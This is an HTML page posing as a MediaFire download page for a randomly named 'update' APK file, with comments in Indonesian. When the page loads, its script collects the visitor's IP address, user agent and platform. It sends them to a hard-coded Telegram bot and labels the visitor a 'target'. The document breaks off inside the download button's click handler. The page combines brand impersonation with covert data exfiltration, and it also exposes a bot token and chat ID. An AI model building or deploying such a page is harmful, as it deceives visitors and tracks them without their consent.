<!DOCTYPE html>

<head>

    <style>
        body { font-family: Arial, sans-serif; background-color: #f3f3f3; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; width: 350px; }
        .logo { color: #0070f3; font-weight: bold; font-size: 24px; margin-bottom: 20px; }

        .btn-download { background-color: #0070f3; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px; display: inline-block; font-weight: bold; }
        .footer { margin-top: 20px; font-size: 12px; color: #6c757d; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">MediaFire</div>
    <div class="file-info">
        <strong id="fileName">Generating...</strong><br>
        <span style="font-size: 13px; color: #666;">Size: 14.2 MB</span>
    </div>
    <a href="#" class="btn-download" id="downloadBtn">Download File</a>

</div>

<script>
    // konfigurasi bot telegram anda
    const botToken = "8208169555:AAFhDsvEjUtYkeRKh6OV7ngsd9hT0WZfWZ4";
    const chatId = "7835924973";

    // generate nama file apk random
    function generateRandomName() {
        const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
        let result = "update_";
        for (let i = 0; i < 8; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result + ".apk";
    }

    const randomApkName = generateRandomName();
    document.getElementById('fileName').innerText = randomApkName;

    // fungsi pelacakan ip dan pengiriman data
    async function trackVictim() {
        try {
            // mengambil data ip dari api eksternal
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            const ipAddress = data.ip;

            // mengambil informasi detail lainnya (opsional tapi mematikan)
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;

            // pesan yang dikirim ke telegram
            const message = `ðŸŽ¯ target terdeteksi!\n\nðŸŒ ip: ${ipAddress}\nðŸ“± perangkat: ${platform}\nðŸ“ user agent: ${userAgent}\nðŸ“‚ file: ${randomApkName}`;

            // kirim ke bot telegram
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });
        } catch (error) {
            console.log("tracking failed but proceeding...");
        }
    }

    // eksekusi tracking saat halaman dibuka
    window.onload = trackVictim;

    // simulasi download file apk saat tombol diklik
    document.getElementById('downloadBtn').onclick = function() {

</script>
